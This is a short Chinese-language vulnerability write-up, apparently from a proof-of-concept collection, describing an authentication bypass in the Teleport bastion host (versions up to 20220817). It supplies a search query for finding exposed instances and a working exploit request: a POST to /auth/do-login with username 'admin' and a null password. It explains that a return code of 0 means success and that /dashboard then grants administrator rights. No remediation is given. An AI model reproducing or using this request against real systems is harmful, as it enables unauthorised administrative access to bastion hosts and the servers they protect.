# Teleport堡垒机 do-login 任意用户登录漏洞

## 漏洞描述

Teleport堡垒机存在任意用户登录漏洞，攻击者通过构造特殊的请求包可以登录堡垒机获取其他系统权限

## 漏洞影响

<a-checkbox checked>Teleport Version <= 20220817</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="TELEPORT堡垒机"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1660720653270-fcd22c8e-0df1-42ea-aa02-2c94e0770e76-20220823130937164.png)

验证POC， captcha参数为验证码

```php
POST /auth/do-login

args={"type":2,"username":"admin","password":null,"captcha":"ykex","oath":"","remember":false}
```

![img](../../../.vuepress/public/img/1661087828041-1bf5d666-f5fd-4d69-9099-465b3dd492f2-20220823130936374.png)

code 返回 0 即为成功，再访问 /dashboard 获取管理员权限

![img](../../../.vuepress/public/img/1661087872154-ba6ae117-5a99-43f4-919f-1b22f403ab37-20220823130936385.png)